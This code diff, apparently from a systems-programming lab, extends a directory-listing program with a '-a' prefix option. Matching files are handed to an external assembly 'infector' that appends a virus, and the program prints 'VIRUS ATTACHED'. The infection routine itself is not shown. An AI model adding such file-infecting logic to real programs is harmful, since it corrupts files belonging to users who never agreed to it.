@@ -17,6 +17,8 @@ struct linux_dirent {
 };
 
 extern int system_call();
+extern void infection();
+extern void infector(char* fileName);
 
 int main(int argc, char *argv[], char *envp[]) {
     char buffer[BUFFER_SIZE];
@@ -45,6 +47,17 @@ int main(int argc, char *argv[], char *envp[]) {
             system_call(SYS_WRITE, STDOUT, file->name, strlen(file->name));
             system_call(SYS_WRITE, STDOUT, "\n", 1);
         }
+
+        if (argc > 1 && strncmp(argv[1], "-a", 2) == 0) {
+            char* prefix = argv[1] + 2; //what is after -a
+            if (strncmp(file->name, prefix, strlen(prefix)) == 0) {
+                infector(file->name);  // call the assembly infector to append the virus
+                system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED", 14);
+                system_call(SYS_WRITE, STDOUT, file->name, strlen(file->name));
+                system_call(SYS_WRITE, STDOUT, "\n", 1);
+            }
+        }
+
         bpos += file->len;
     }
 
